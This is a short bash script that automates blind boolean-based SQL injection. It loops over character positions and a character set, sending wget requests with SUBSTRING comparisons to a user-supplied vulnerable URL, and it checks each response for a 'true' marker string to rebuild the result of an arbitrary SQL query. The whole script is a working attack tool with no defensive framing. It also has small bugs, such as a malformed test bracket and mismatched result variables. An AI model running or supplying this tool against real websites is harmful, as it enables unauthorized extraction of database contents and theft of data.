#!/usr/bin/bash
PATH=$PATH:/bin:/usr/bin:blind.sh
export PATH
charset=`echo {0..9} {A..z} \. \. \; \: \- \_ \@`
export URL="<Enter URL along with the injection point>" #For example www.images.com/cats.php?ip=1
export truestring='<Enter String that appears when output is correct on the web page.>'
export maxlength=$1 #First argument on the command line would be the length up to which you would want to enumrate
export query=$2 #Second argument on the command line would be the SQL query that you want to use.
export results=""

echo "extracting the results from $query..."

for ((j=1;j<$maxlength;j+=1))
do
       export nthchar=$j
       
       for i in $charset
       do
       
          `wget "$URL and SUBSTRING(("$query"),"$nthchar",1)='$i" -q -O -`| grep "$truestring" &> /dev/null
           if [ "$?" == "0"]
           then
                   echo Character number $nthchar found: $i
                   export result+=$i
                   break
           fi
   done
done

echo Results: $result
